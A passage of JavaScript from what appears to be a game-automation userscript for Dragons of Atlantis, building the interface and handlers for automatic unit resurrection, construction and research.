			var value = parseIntZero(event.target.value);
			
			// The upper limit is not important because we are looking at a maximum number of units
			if ( isNaN(value) || value < 0 )
			{
				event.target.style.backgroundColor = '#faa';
				dialogError (translate('Invalid number of troops',t.container));
			} 
			else {
				event.target.value = value;
				Data.options.training.units_cap[ unit_type ] = value;
				event.target.style.backgroundColor = '';
			}
		}
	},
	
	//----------------------------------------------------------------------------
	//*** Jobs Tab - Resurrect Sub-tab ***
	//----------------------------------------------------------------------------
	tabResurrect : function (){
		var t = Tabs.Jobs;
		
		// Create status ticker
		var header = 
		 '<div class=' + UID['title'] + '>' + translate('Resurrection Progress') + '</div>'
		+'<div class=' + UID['status_ticker'] + ' style="margin-bottom: 5px !important">'
		+'	<center>'
		+'		<input id=' + setUID('Tabs.Jobs.tabResurrect.enabled') + ' type=button />'
		+'	</center>'
		+'	<div id=' + setUID('Tabs.Jobs.tabResurrect.report') + ' class='+ UID['status_report'] + '></div>'
		+'	<br>'
		+'	<div id='+ setUID('Tabs.Jobs.tabResurrect.feedback') +' class='+ UID['status_feedback'] + '></div>'
		+'</div>'
		
		// Styles & Sets
		$J('#'+UID['Tabs.Jobs.header'])
		.css({
			 height			: '205px'
			,marginBottom	: '2px'
		})
		.html( header );
		
		var html = 
		'<div style="overflow:hidden;">';
		
		var city_idx = OUTPOST_TYPE_INDEX['SpectralDragonOutpost'];
		var city = Seed.cities[city_idx];
		
		html +=
		 '<div class=' + UID['subtitle'] + ' style="background-color: rgba(70,70,70,0.8) !important;">'
		+'	<table class=' + UID['table'] + ' width=100%>'
		+'	<tr>'
		+'		<td align=left width=30%>&nbsp</td>'
		+'		<td align=center width=40%>'+ translate(city.name) + '</td>'
		+'		<td id='+ setUID('Tabs.Jobs.tabResurrect.set_' + city_idx)  + ' align=right width=30%>'
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'
		+'<table class="' + UID['table'] + ' zebra" style="width:475px;max-width:475px">';
		
		// Create unit table for each city
		var elements_id = [];
		var bt_id = [];
		var bt_rel_id = [];
		
		// in case the city is not been defined in Seed.updateCity skip to next in array.
		if ( !city ) return;

		html +=
		 '	<tr>'
		+'		<th>' + translate('Total') + '</th>'
		+'		<th></th>'
		+'		<th>' + translate('Quantity') + '</th>'
		+'		<th></th>'
		+'		<th></th>'
		+'	</tr>';
		
		// we get the Keys list from Data.defaults for to respect the order
		var units_type = Units.resurrect_units_type;
		var souls = Seed.cities[0].souls
		for ( i=0; i < units_type.length; i++ )
		{
			var unit_type = units_type[i];
			
			var total_unit_resurrect = souls [ unit_type ];
			if ( !total_unit_resurrect || isNaN(total_unit_resurrect) ){
				total_unit_resurrect = 0;
			}

			var unit_quantity = Data.options.resurrection.city[ 0 ].units[ unit_type ];
			if ( !unit_quantity || isNaN(unit_quantity) ){
				unit_quantity = 0;
				Data.options.resurrection.city[ 0 ].units[ unit_type ] = unit_quantity;
			}
			
			if (unit_quantity > total_unit_resurrect ) {
				unit_quantity = total_unit_resurrect;
				Data.options.resurrection.city[ 0 ].units[ unit_type ] = unit_quantity;
			}
			
			html +=
			 '	<tr>'
			+'		<td id=' + setUID('Tabs.Jobs.tabResurrect.TotalR_' + unit_type) + ' align=right class=jewel>'
			+'		' + total_unit_resurrect 
			+'		</td>'
			+'		<td title="' + translate(unit_type) + '">' 
			+'			<span class="' + UID['doa-icons'] + ' i-' + unit_type + '"></span>'
			+'		</td>'
			+'		<td>'
			+'		<input type=text id=' + setUID('Tabs.Jobs.tabResurrect.units_' + i) + ' ref=' + unit_type +' maxlength=6 size=6 value="' + unit_quantity + '" style="text-align:right;" />'
			+'		</td>'
			// didi : add release button
			+'		<td align=right width=7%>'
			+'			<input title="'+translate('Release')+'" type=image class="'+ UID['doa-icons'] + ' i-cancel" id=' + setUID('Tabs.Jobs.tabResurrect.Rel_'+ unit_type) + ' ref=' + unit_type + '  value="" />'
			+'		</td>'
			+'		<td style="font-size:8pt;">'
			+ 			translate(unit_type) 
			+'		</td>'
			+'		<td id=' + setUID('Tabs.Jobs.tabResurrect.feedback_' + unit_type) + ' style="width:50%;white-space:normal;font-size:8pt;">'
			+'		</td>'
			// didi : add resurrect button
			+'		<td align=right width=7%>'
			+'			<input type=image class="'+ UID['doa-icons'] + ' i-resurrect" id=' + setUID('Tabs.Jobs.tabResurrect.Now_'+ unit_type) + ' ref=' + unit_type + '  value="" />'
			+'		</td>'
			+'	</tr>';
		
			elements_id.push( UID['Tabs.Jobs.tabResurrect.units_' + i] );
			bt_id.push( UID['Tabs.Jobs.tabResurrect.Now_'+ unit_type] );
			bt_rel_id.push( UID['Tabs.Jobs.tabResurrect.Rel_'+ unit_type] );
		
		}
		
		html += 
		 '</table>'
		+'</div>';
			
		$J('#'+UID['Tabs.Jobs.content'])
		.css({
			'height'     : '475px',
			'margin-top' : '15px'
			//,'overflow'   : 'hidden'
		})
		.html( html );
		
		$J('#'+UID['Tabs.Jobs.content'])
		.addClass( UID['scrollable'] );

		// Add event listeners for unit quantities 
		for ( var i=0; i < elements_id.length; i++ ) 
		{
			$J('#'+elements_id[i]).change( onChangeUnits );
			$J('#'+elements_id[i]).click( onChangeUnits );
		}
		
		// Add event listener for Enabled/off button
		$J('#'+UID['Tabs.Jobs.tabResurrect.enabled']).click (function (){
			var t=Tabs.Jobs;
			t.setResurrectEnable (!Data.options.resurrection.enabled);
		});

		// Didi : Add event listeners for unit immediat resurrection 
		for ( var i=0; i < bt_id.length; i++ ) 
		{
			$J('#'+bt_id[i]).click( onResurrectUnits );
		}

		// Didi : Add event listeners for unit immediat release 
		for ( var i=0; i < bt_rel_id.length; i++ ) 
		{
			$J('#'+bt_rel_id[i]).click( onReleaseUnits );
		}

		// Update units on change
		function onChangeUnits ( event )
		{
			var unit_quantity = parseIntZero(event.target.value);
			var city_idx = OUTPOST_TYPE_INDEX['SpectralDragonOutpost'];
			var unit_type = event.target.getAttribute('ref');
			var reqs = t.checkResurrectReqs( unit_type, unit_quantity, city_idx );
			
			if ( isNaN(unit_quantity) || unit_quantity < 0 || unit_quantity > (Seed.cities[0].souls[unit_type]||0) ){
				event.target.style.backgroundColor = '#faa';
				dialogError ( translate('Invalid number of troops', t.container) );
			}
			else if (unit_quantity != Data.options.resurrection.city[ 0 ].units[ unit_type ]) {
				event.target.value = unit_quantity;
				Data.options.resurrection.city[ 0 ].units[ unit_type ] = unit_quantity;
				event.target.style.backgroundColor = '';
				t.refreshReleaseBtn(OUTPOST_TYPE_INDEX['SpectralDragonOutpost']);
			}
		}
		
		// Resurrect units immediately
		function onResurrectUnits ( event )
		{
			var city_idx = OUTPOST_TYPE_INDEX['SpectralDragonOutpost'];
			var unit_type = event.target.getAttribute('ref');
			var unit_quantity = parseInt (Data.options.resurrection.city[ 0 ].units[ unit_type ]);

			t.doResurrect( unit_type, unit_quantity, city_idx, true );

		}

		// Release units immediately
		function onReleaseUnits ( event )
		{
			var unit_type = event.target.getAttribute('ref');
			var unit_quantity = parseInt (Data.options.resurrection.city[ 0 ].units[ unit_type ]);

			t.doRelease( unit_type, unit_quantity );

		}

		
		// Didi : Add refresh button of current content
		t.refreshResurectBtn(OUTPOST_TYPE_INDEX['SpectralDragonOutpost']);
		t.refreshReleaseBtn(OUTPOST_TYPE_INDEX['SpectralDragonOutpost']);

		t.refreshResurrectButton ( Data.options.resurrection.enabled );
		
		//First Run of resurrectStatTick
		t.resurrectStatTick();
		
		// Timers
		t.resurrection.timer.stat = setInterval(t.resurrectStatTick, 1000);
	},
	
	refreshResurectBtn : function ( city_idx )
	{
		var t = Tabs.Jobs;
		if (city_idx !== OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) return;
		var city = Seed.cities[city_idx];
		if ( !city ) return;
		var units_type = Units.resurrect_units_type;
		for (var i=0; i < units_type.length; i++ )
		{
			var unit_type = units_type[ i ];
			var unit_quantity =	Data.options.resurrection.city[ 0 ].units[ unit_type ];
			var but_res = $id(UID['Tabs.Jobs.tabResurrect.Now_'+ unit_type]);
			if (!but_res) continue;
			if (unit_quantity === 0)
			{
				setButtonStyle(but_res,'KO');
			} 
			else
			{
				var reqs = t.checkResurrectReqs( unit_type, unit_quantity, city_idx );
				if (!reqs.msg) 
				{
					setButtonStyle (but_res, 'OK');
				}
				else
				{
					setButtonStyle (but_res, 'W');
				}
			}
				
		}
			
		function setButtonStyle (element, stat) 
		{
			if (!element) return;

			switch (stat)
			{
				case 'OK':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_green']);
					break;
				case 'KO':
					element.disabled = true;
					if ($J(element).hasClass(UID['bnt_image_green']))$J(element).removeClass(UID['bnt_image_green']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_disabled']);
					break;
				case 'W':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_green'])) $J(element).removeClass(UID['bnt_image_green']);
					$J(element).addClass(UID['bnt_image_orange']);
					break;
				
			}
		}

	},
	
	refreshReleaseBtn : function ( city_idx )
	{
		var t = Tabs.Jobs;
		if (city_idx !== OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) return;
		var city = Seed.cities[city_idx];
		if ( !city ) return;
		var units_type = getKeys( Data.defaults.options.resurrection.city[ 0 ].units );
		for (var i=0; i < units_type.length; i++ )
		{
			var unit_type = units_type[ i ];
			var unit_quantity =	Data.options.resurrection.city[ 0 ].units[ unit_type ];
			var but_res = $id(UID['Tabs.Jobs.tabResurrect.Rel_'+ unit_type]);
			if (!but_res) continue;
			if (unit_quantity === 0 || unit_quantity > Seed.cities[0].souls[unit_type] )
			{
				setButtonStyle(but_res,'KO');
			} 
			else
			{
				setButtonStyle (but_res, 'OK');
			}
				
		}
			
		function setButtonStyle (element, stat) 
		{
			if (!element) return;

			switch (stat)
			{
				case 'OK':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_green']);
					break;
				case 'KO':
					element.disabled = true;
					if ($J(element).hasClass(UID['bnt_image_green']))$J(element).removeClass(UID['bnt_image_green']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_disabled']);
					break;
				case 'W':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_green'])) $J(element).removeClass(UID['bnt_image_green']);
					$J(element).addClass(UID['bnt_image_orange']);
					break;
				
			}
		}

	},

	//----------------------------------------------------------------------------
	//*** Jobs Tab - Build Sub-tab ***
	//----------------------------------------------------------------------------
	tabBuild : function ()
	{
		var t = Tabs.Jobs;
		
		var header =
		 '<div class=' + UID['title'] + '>' + translate('Construction Progress') + '</div>'
		+'<div class=' + UID['status_ticker'] + '>'
		+'	<center>'
		+'		<input id=' + setUID('Tabs.Jobs.tabBuild.enabled') + ' type=button />'
		+'	</center>'
		+'	<div id=' + setUID('Tabs.Jobs.tabBuild.report')   + ' class=' + UID['status_report']   + '></div>'
		+'	<br>'
		+'	<div id=' + setUID('Tabs.Jobs.tabBuild.feedback') + ' class=' + UID['status_feedback'] + '></div>'
		+'</div>';
		
		$J('#'+UID['Tabs.Jobs.header'])
		.css({
			'height'        : '205px',
			'margin-bottom'	: '2px'
		})
		.html( header );

		$J('#'+UID['Tabs.Jobs.content'])
		.css({
			'height'        : '475px',
			'margin-top'    : '15px',
			'overflow'      : 'hidden'
		})
		.html( '<div id=' + setUID('Tabs.Jobs.tabBuild.content') + '>' );
		
		
		html = '';
		
		var build_list  = [],
			checkbox_id = [],
			select_id   = [],
			button_id = [];

		for (var city_idx=0; city_idx < Seed.cities.length; city_idx++)
		{
			var city = Seed.cities[city_idx];
			
			// in case the city is not been defined in Seed.updateCity skip to next in array.
			if ( !city ) continue;
						
			build_list = Buildings.getBuildingList(city_idx);
			//console.log(city_idx+';'+inspect(build_list,8,1));
			
			html +=
			 '<h4 ref=' + city_idx + ' class=' + UID['subtitle'] + '>'
			+'	<table class=' + UID['table'] + ' width=100%>'
			+'	<tr>'
			+'		<td align=left width=30%>&nbsp</td>'
			+'		<td align=center width=40%>'+ translate(city.name) + '</td>'
			+'		<td id='+ setUID('Tabs.Jobs.tabBuild.lefttime_' + city_idx)  + ' align=right width=30%>'
			+'		</td>'
			+'	</tr>'
			+'	</table>'
			+'</h4>'
			+'<div style="overflow:hidden;min-height:'+(23 * build_list.length)+'px;max-height:'+(23 * build_list.length)+'px;">'
			+'<table class="' + UID['table'] + ' zebra" style="width:475px;max-width:475px">';
			
			for ( var i=0; i < build_list.length; i++ )
			{
				var build_type = build_list[i];
				
				if ( build_type ) {
				
					var build_level = Buildings.getLevel( city_idx, build_type );
					var ref = city_idx + '_' + build_type;
					
					if (!Data.options.building.level_cap[city_idx]) {
						Data.options.building.level_cap[city_idx]={};
					}
					if (!Data.options.building.level_enable[city_idx]) {
						Data.options.building.level_enable[city_idx]={};
					}
					if ( !Data.options.building.level_cap[city_idx][build_type] )
					{					  
						Data.options.building.level_cap[city_idx][build_type] = build_level.min;
					}
					
					var level_cap = Data.options.building.level_cap[city_idx][build_type];
					var city_type = 'C';
					if (city_idx > 0) city_type = 'O';
					if (city_idx === OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) city_type = 'S';
					
					if ( build_level.min < (Seed.stats.building[ build_type ].level.length || 12) - 1  )
					{
						html +=
						 '<tr>'
						+'	<td>'
						+'	<label>'
						+'		<input type=checkbox '
						+'			id=' + setUID('Tabs.Jobs.tabBuild.level_enable_' + ref) 
						+'			ref=' + ref
						+ 			( Data.options.building.level_enable[city_idx][build_type] ? ' checked' : '' ) 
						+'		/>'
						+'		<span class="' + UID['doa-icons'] + ' i-' + build_type + '-' + city_type + '"></span>'
						+ 		translate(build_type)
						+'	</label>'
						+'	</td>'
						+'	<td>'
						+'		<span class=jewel>'
						+'			(' + build_level.min + ( build_level.min !== build_level.max ? '-' + build_level.max : '' ) + ')'
						+'		</span>'
						+'	</td>'
						+'	<td>'
						+'	<select id=' + setUID( 'Tabs.Jobs.tabBuild.level_cap_' + ref ) + ' ref=' + ref + '>';
						
						for ( var lvl = 0; lvl < (Seed.stats.building[ build_type ].level.length || 12); lvl++)
						{
							html +=
							 '	<option value=' + lvl + ( build_level.min > lvl ?' style="display:none;"' : '') + (lvl==level_cap ? ' selected' : '' ) + '>' 
							+	 	lvl 
							+'	</option>';
						}
						
						html += 
							' </select>';
						
						checkbox_id.push( UID['Tabs.Jobs.tabBuild.level_enable_'+ ref] );
						select_id.push( UID['Tabs.Jobs.tabBuild.level_cap_'+ ref] );
					} 
					else {
						html +=
						 '<tr>'
						+'	<td>'
						+'		<span style="margin-left:17px" class="' + UID['doa-icons'] + ' i-' + build_type + '-' + city_type + '"></span>'
						+'		<i>'
						+ 		translate(build_type)
						+'		</i>'
						+'	</td>'
						+'	<td>'
						+'		<span class=jewel>'
						+'			(' + build_level.min + ( build_level.min !== build_level.max ? '-' + build_level.max : '' ) + ')'
						+'		</span>'
						+'	</td>'
						+'	<td style="color:#004">'
						+		translate ('Max');
					}
					
					html +=
					 '		</td>'
					+'		<td id=' + setUID( 'Tabs.Jobs.tabBuild.feedback_' + ref ) 
					+' 			class=jewel valign=top style="width:50%;white-space:normal;font-size:8pt;">'
					+'		</td>';
					
					if ( build_level.min < (Seed.stats.building[ build_type ].level.length || 12) - 1 )
					{
						// didi : add building button
						html +=
						 '	<td align=right width=10%>'
						//+'	<div style="overflow-y:hidden;max-height:10px;">'
						+'		<input type=image class="'+ UID['doa-icons'] + ' i-Building" id=' + setUID('Tabs.Jobs.tabBuild.Now_'+ ref) + ' ref=' + ref + '  value="" />'
						//+'	</div>'
						+'	</td>';
						button_id.push(UID['Tabs.Jobs.tabBuild.Now_'+ ref]);
					}
					html +=
					 '	</tr>';
					
				}
				else {
					html +=
					 '<tr>'
					+'	<td colspan=6><hr></td>'
					+'</tr>';
				}
			}
			
			html += 
			 '</table>'
			+'</div>';
			
		}  

		
		var $container = $J('#'+UID['Tabs.Jobs.tabBuild.content']);
		
		$container
		.css ({
			'height'     : ($J('#'+UID['Tabs.Jobs.content']).innerHeight()-10) + 'px',
			'overflow'   : 'hidden'
		})
		.addClass ( UID['scrollable'] )
		.html ( html )
		.accordion ({
			collapsible	: true
			,active		: Data.options.building.accordion
			,changestart	: function( event, ui ) {
				if ( !ui || !ui.newHeader || ui.newHeader.length < 1 ) return;
				var city_idx = $J( ui.newHeader[0] ).attr('ref');
				if ( city_idx ) {
					Data.options.building.accordion = parseInt( city_idx );
					//didi : add refresh train button of new content
					t.refreshBuildBtn(Data.options.building.accordion);
				}
			}
		});
		
		
		function onLevelEnable ( event )
		{
			var ref = $J(this).attr('ref').split('_');
			
			var city_idx = ref[0];
			var build_type = ref[1];
			
			var city_id = Seed.cities[ city_idx ].id;
			
			Data.options.building.level_enable[ city_idx ] [ build_type ] = event.target.checked;
			
			if (event.target.checked) {
				// Auto set Next Level available
				var build_level = Buildings.getLevel( city_idx, build_type );
				var level_cap = Data.options.building.level_cap[ city_idx ][ build_type ];
				var level_max = Seed.stats.building[ build_type ].level.length - 1;
				
				if ( build_level.min >= level_cap && build_level.min < level_max ) 
				{
					function setLevel ( level ){
						$J('#'+UID['Tabs.Jobs.tabBuild.level_cap_' + city_idx + '_' + build_type]).
						css('color', '#000').
						val( level );
						Data.options.building.level_cap[ city_idx ][ build_type ] = level;
					}
					var next_level = build_level.min + 1;
					if ( next_level > 9 )
					{
						dialogBox({
						id		  : setUID('dialog-confirm'),
						centerTo  : $container,
						title	  : translate('Next Level'),
						html	  : '<br>' + translate('Are you sure you want to') + '<br><br>' + translate('Build') +' '+ translate('Level') + '<b> ' + next_level + '</b>?',
						buttons   : [
							{
								text: translate('Confirm'),
								click: function() { 
									setLevel( next_level );
									t.checkBuildReqs( city_idx, build_type );
									$J(this).dialog('destroy');
								}
							},
							{
								text: translate('Cancel'),
								click: function() { 
									$J(this).dialog('destroy');
								}
							}
						]
						});
					} else {
						setLevel( next_level );
					}
				}
			}
			
			t.checkBuildReqs( city_idx, build_type );
			
			if ( Data.options.building.enabled && event.target.checked ) {
				t.buildTick();
			}
		}

		function onChangeBuildCap ( event ) 
		{
			var ref = $J(this).attr('ref').split('_');
			
			var city_idx = ref[0];
			var build_type = ref[1];

			Data.options.building.level_cap[ city_idx ] [ build_type ] = event.target[event.target.selectedIndex].value;
		
			event.target.style.backgroundColor = '';
			event.target.style.color = '#000';
			
			t.checkBuildReqs( city_idx, build_type );
			
			if ( Data.options.building.enabled ) {
				t.buildTick();
			}
		}
		
		// Build immediately
		function onBuild ( event )
		{
			var t = Tabs.Jobs;
			var args = event.target.getAttribute('ref').split('_');
			var city_idx = args[0];
			var build_type = args[1];
			
			//Didi : get building with min level
			var build_list = Buildings.getList ( city_idx, build_type, false );
			build_list.sort ( function(a,b){return a.level-b.level} );
			
			//Didi : exit if no found
			if (build_list.length == 0 ) return;
			var job = build_list[0];
			
			//Didi : exit if building not exists
			if (!job) return;

			//Didi : exit if building select not have the min level !
			var build_level = Buildings.getLevel( city_idx, build_type )
			if (job.level > build_level.min) return;
			
			//Didi : do build
			t.building.inProgress=true;
			t.doBuild( job.id, city_idx, true );
		}

		// Didi : Add event listeners for unit immediat train 
		for ( var i=0; i < button_id.length; i++ ) 
		{
			$J('#'+button_id[i]).click( onBuild );
		}

		// Add the event listeners for each city's building types
		// and for each city's building type caps
		for ( var i=0; i < checkbox_id.length; i++ ) 
		{
			$J('#'+checkbox_id[i]).click ( onLevelEnable );
			$J('#'+select_id[i]).change( onChangeBuildCap );
			
			var ref = $J('#'+checkbox_id[i]).attr('ref').split('_');
			t.checkBuildReqs( ref[0], ref[1] );
		}
		
		// Add the event listeners for the auto-build button and scrollbar
		$J('#'+UID['Tabs.Jobs.tabBuild.enabled']).click (function (){
			var t=Tabs.Jobs;
			t.setBuildEnable (!Data.options.building.enabled);
		});
		
		t.refreshBuildButton ( Data.options.building.enabled );
		
		// Didi : Add refresh button of current content
		t.refreshBuildBtn(Data.options.building.accordion || 0);

		// First Run of buildStatTick
		t.buildStatTick();
		
		// start the build statistics timer
		t.building.timer.stat = setInterval ( t.buildStatTick, 1000 );
	},

	// Didi : Refresh the button of training
	refreshBuildBtn : function ( city_idx )
	{
		var t = Tabs.Jobs;
		var build_list = [];
		
		if (city_idx !== (Data.options.building.accordion || 0)) return;
		var city = Seed.cities[city_idx];
		if ( !city ) return;

		build_list = Buildings.getBuildingList(city_idx);

		var jobs = getJobs ( 'building', city_idx );
		var job;
		if (jobs.length > 0) job=jobs[0];

		for (var i=0; i < build_list.length; i++ )
		{
			build_type=build_list[i];

			var but_build = $id(UID['Tabs.Jobs.tabBuild.Now_'+city_idx +'_'+ build_type]);
			if (!but_build) continue;
			
			var build_level = Buildings.getLevel( city_idx, build_type );

			if ( build_level.min < (Seed.stats.building[ build_type ].level.length || 12) - 1  && build_level.min > 0 && (!job || job.city_building_type !== build_type) )
			{
				var reqs=t.checkBuildReqs( city_idx, build_type );
				if (!reqs.msg || reqs.capped ) 
				{
					setButtonStyle (but_build, 'OK');
				}
				else
				{
					setButtonStyle (but_build, 'W');
				}
			} else {
				setButtonStyle(but_build,'KO');
			} 
		
		}
			
		function setButtonStyle (element, stat) 
		{
			if (!element) return;

			switch (stat)
			{
				case 'OK':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_green']);
					break;
				case 'KO':
					element.disabled = true;
					if ($J(element).hasClass(UID['bnt_image_green']))$J(element).removeClass(UID['bnt_image_green']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_disabled']);
					break;
				case 'W':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_green'])) $J(element).removeClass(UID['bnt_image_green']);
					$J(element).addClass(UID['bnt_image_orange']);
					break;
				
			}
		}

	},
	
	//----------------------------------------------------------------------------
	//*** Jobs Tab - Research Sub-tab ***
	//----------------------------------------------------------------------------
	tabResearch : function ()
	{
		var t = Tabs.Jobs;

		var header =
		 '<div class=' + UID['title'] + '>' + translate('Research Progress') + '</div>'
		+'<div class=' + UID['status_ticker'] + '>'
		+'	<center>'
		+'		<input id=' + setUID('Tabs.Jobs.tabResearch.enabled') + ' type=button />'
		+'	</center>'
		+'	<div id=' + setUID('Tabs.Jobs.tabResearch.report')   + ' class=' + UID['status_report']   + '></div>'
		+'	<br>'
		+'	<div id=' + setUID('Tabs.Jobs.tabResearch.feedback') + ' class=' + UID['status_feedback'] + '></div>'
		+'</div>';
		
		$J('#'+UID['Tabs.Jobs.header'])
		.css({
			'height'		 : '205px',
			'margin-bottom'	 : '2px'
		})
		.html( header );
		
		var html = 
		'<div style="overflow:hidden;">';
		
		var nb_outpost = 0;
		if ( Data.options.cheat.outpost_research ) {
			for ( var i = 1 ; i < Seed.cities.length ; i++ ) {
				var city = Seed.cities[i];
				if (city && city.figures.queue_lengths['research']) {
					nb_outpost++;
				}
			}
		}

		var city = Seed.cities[0];

		
		html +=
		 '<div class=' + UID['subtitle'] + '>' + translate(city.name) + (nb_outpost > 0 ? ' (+ '+nb_outpost+' '+translate('Outpost')+')':'')+'</div>'
		+'<table class="' + UID['table'] + ' zebra" style="width:475px;max-width:475px">';
		
		var checkbox_id = [];
		for ( var i=0; i < t.research_type.length; i++ )
		{
			var research_type = t.research_type[i];
			var research_level = Seed.player.research[research_type] || 0;
			
			if ( !Data.options.research.level_cap[research_type] )
			{
				Data.options.research.level_cap[research_type] = research_level;
			}
			
			var level_cap = Data.options.research.level_cap[research_type];
			

			if ( research_level < (Seed.stats.research[ research_type ].level.length || 11) - 1 )
			{
				html +=
				 '<tr>'
				+'	<td>'
				+'	<label>'
				+'		<input type=checkbox id=' + setUID('Tabs.Jobs.tabResearch.level_enable_' + research_type) + ' ' + (Data.options.research.level_enable[research_type] ? 'checked' : '') + ' ref=' + i + ' /> ' 
				+'		<span class="' + UID['doa-icons'] + ' i-' + research_type + '"></span>'
				+ 		translate(research_type) 
				+'	</label>'
				+'	<td>'
				+'		<span class=jewel>' + research_level + '</span>'
				+'	</td>'
				+'	</td>'
				+'	<td>'
				+'	<select id=' + setUID('Tabs.Jobs.tabResearch.level_cap_' + research_type) + ' ref=' + i + '>';
				
				for ( var lvl = 0; lvl < (Seed.stats.research[ research_type ].level.length || 11); lvl++)
				{
					html +=
					 '<option value=' + lvl + ( research_level > lvl ?' style="display:none;"' : '') + (lvl==level_cap ? ' selected' : '' ) + '>' 
					+	 lvl 
					+'</option>';
				}
				
				html += '</select>';
				
				checkbox_id.push(UID['Tabs.Jobs.tabResearch.level_enable_'+research_type]);
			}
			else {
				html += 
				 '<tr>'
				+'	<td>'
				+'		<span style="margin-left:17px" class="' + UID['doa-icons'] + ' i-' + research_type + '"></span>'
				+'		<i>'
				+ 		translate(research_type) 
				+'		</i>'
				+'	<td>'
				+'		<span class=jewel>' + research_level + '</span>'
				+'	</td>'
				+'	</td>'
				+'	<td style="color:#004">'
				+		translate ('Max');
			}
			
			
			html +=
			 '	</td>'
			+'	<td id=' + setUID('Tabs.Jobs.tabResearch.feedback_' + research_type) + ' class=jewel valign=top style="width:50%;white-space:normal;"></td>'
			+'</tr>';

		}
		
		html += '</table></div>';
		
		$J('#'+UID['Tabs.Jobs.content'])
		.css({
			'height'     : '475px',
			'margin-top' : '15px',
			'overflow'   : 'hidden'
		})
		.html( html );
		
		
		// Add the event listeners for the research types
		for ( var i=0; i < checkbox_id.length; i++ )
		{
			$J('#'+checkbox_id[i]).click( onClickResearch );
		}
		
		// Add the event listeners for the research caps
		// And restore the persistent data since it has to be done in the same loop
		for ( var i=0; i < t.research_type.length; i++ ) 
		{
			var research_type = t.research_type[i];
			$J('#'+UID['Tabs.Jobs.tabResearch.level_cap_' + research_type]).change( onChangeResearchCap );
			
			t.checkResearchReqs( research_type );
		}
		
		$J('#'+UID['Tabs.Jobs.tabResearch.enabled']).click (function (){
			var t=Tabs.Jobs;
			t.setResearchEnable ( !Data.options.research.enabled );
		});
		
		t.refreshResearchButton ( Data.options.research.enabled );
		
		function onClickResearch ( event )
		{
			var t = Tabs.Jobs;
			var n = parseInt(event.target.getAttribute('ref'));
			var research_type = t.research_type[n];
			
			Data.options.research.level_enable[ research_type ] = event.target.checked;
			
			if (event.target.checked) {
				// Auto set Next Level available
				var research_level = Seed.player.research[ research_type ] || 0;
				var level_cap = Data.options.research.level_cap[ research_type ];
				var level_max = Seed.stats.research[ research_type ].level.length - 1;
				
				if ( research_level >= level_cap && research_level < level_max )
				{
					$J('#'+UID['Tabs.Jobs.tabResearch.level_cap_' + research_type]).
					css('color', '#000').
					val( research_level + 1 );
					
					Data.options.research.level_cap[ research_type ] = research_level + 1;
				} 
			}
		
			t.checkResearchReqs( research_type );
			
			if ( Data.options.research.enabled && event.target.checked) {
				t.researchTick();
			}
			
		}


		// Add to persistent storage
		function onChangeResearchCap ( event )
		{
			var t = Tabs.Jobs;
			var n = parseInt(event.target.getAttribute('ref'));
			var research_type = t.research_type[n];
			
			Data.options.research.level_cap[ research_type ] = event.target[event.target.selectedIndex].value;
			
			event.target.style.backgroundColor = ''; 
			event.target.style.color = '#000';
			
			t.checkResearchReqs( research_type );
			
			if ( Data.options.research.enabled ) {
				t.researchTick();
			}
		}
		
		// First Run of researchStatTick
		t.researchStatTick();
		
		
		// start the research statistics timer
		t.research.timer.stat = setInterval ( t.researchStatTick, 1000 );
	},

	setTrainEnable : function ( on_off )
	{
		var t = Tabs.Jobs;
		t.refreshTrainButton( on_off );
		Data.options.training.enabled = on_off;

		// Stop all Trainings
		clearTimeout ( t.training.timer.tick ); t.training.timer.tick=null;
		
		if ( on_off )
		{
			t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
			t.training.timer.tick= setTimeout( t.trainTick, 3000, 0 );
			t.training.inProgress = false;
		} 
		else {
			// Erase previous feedback
			t.dispFeedback('');
		}
	},
	
	setResurrectEnable : function ( on_off )
	{
		var t = Tabs.Jobs;
		t.refreshResurrectButton( on_off );
		Data.options.resurrection.enabled = on_off;

		// Stop all Trainings
		clearTimeout ( t.resurrection.timer.tick ); t.resurrection.timer.tick=null;
		
		if ( on_off )
		{
			t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
			t.resurrection.timer.tick= setTimeout( t.resurrectTick, 3000 );
			t.resurrection.inProgress = false;
		} 
		else {
			// Erase previous feedback
			t.dispFeedback('');
		}
	},

	setBuildEnable : function ( on_off )
	{
		var t = Tabs.Jobs;
		t.refreshBuildButton( on_off );
		Data.options.building.enabled = on_off;
		
		//Stop all building
		clearTimeout ( t.building.timer.tick ); t.building.timer.tick=null;

		if ( on_off ){
			t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
			t.building.error_delay = 20000;
